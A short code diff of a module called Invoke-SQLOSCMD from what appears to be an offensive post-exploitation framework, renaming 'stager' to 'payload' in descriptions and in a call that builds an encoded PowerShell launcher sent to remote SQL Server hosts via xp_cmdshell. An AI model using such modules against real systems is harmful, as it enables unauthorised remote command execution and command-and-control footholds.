@@ -4,7 +4,7 @@ class Module:
         self.info = {
             'Name': 'Invoke-SQLOSCMD',
             'Author': ['@nullbind', '@0xbadjuju'],
-            'Description': ('Executes a command or stager on remote hosts using xp_cmdshell.'),
+            'Description': ('Executes a command or payload on remote hosts using xp_cmdshell.'),
             'Background' : True,
             'OutputExtension' : None,
             
@@ -28,7 +28,7 @@ class Module:
                 'Value'         :   ''                
             },
             'Instance' : {
-                'Description'   :   'Host[s] to execute the stager on, comma separated.',
+                'Description'   :   'Host[s] to execute the payload on, comma separated.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
@@ -118,7 +118,7 @@ class Module:
                 print helpers.color("[!] Invalid listener: " + listenerName)
                 return ""
             else:
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                 if launcher == "":
                     return ""
                 else:
